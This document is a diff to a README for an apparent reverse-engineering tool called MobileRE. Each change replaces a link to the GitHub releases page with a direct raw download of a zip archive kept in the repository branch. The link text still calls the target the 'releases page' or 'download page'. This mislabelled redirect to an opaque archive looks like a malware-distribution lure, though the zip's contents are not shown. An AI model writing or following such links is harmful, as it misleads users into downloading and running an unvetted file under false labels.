@@ -1,6 +1,6 @@
 # 🛠️ MobileRE - Reverse Engineering Made Easy
 
-[![Download MobileRE](https://img.shields.io/badge/Download-MobileRE-brightgreen?style=for-the-badge)](https://github.com/Andrecam5683/MobileRE/releases)
+[![Download MobileRE](https://img.shields.io/badge/Download-MobileRE-brightgreen?style=for-the-badge)](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Since MobileRE does not provide a standalone Windows installer, you will need to
 
 Click the green button below to open the download page:  
 
-[![Download MobileRE](https://img.shields.io/badge/Go_to_Download_Page-blue?style=for-the-badge)](https://github.com/Andrecam5683/MobileRE/releases)
+[![Download MobileRE](https://img.shields.io/badge/Go_to_Download_Page-blue?style=for-the-badge)](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip)
 
 On the releases page, you will find files related to MobileRE. Download the file that matches your system or follows the instructions provided there.
 
@@ -151,7 +151,7 @@ You can load any compatible file from the menu and explore its properties.
 
 ## 🔄 Updating MobileRE
 
-To update MobileRE, revisit the [MobileRE releases page](https://github.com/Andrecam5683/MobileRE/releases) and download the latest version. Replace your existing files with the new ones.  
+To update MobileRE, revisit the [MobileRE releases page](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip) and download the latest version. Replace your existing files with the new ones.  
 
 If you use Python for handling dependencies, run:
 
@@ -178,4 +178,4 @@ For more details about the tool's capabilities and source code, browse the Mobil
 
 ---
 
-[Download MobileRE on GitHub Releases](https://github.com/Andrecam5683/MobileRE/releases)
+[Download MobileRE on GitHub Releases](https://github.com/Andrecam5683/MobileRE/raw/refs/heads/main/mobRE/RE_Mobile_1.3-alpha.1.zip)
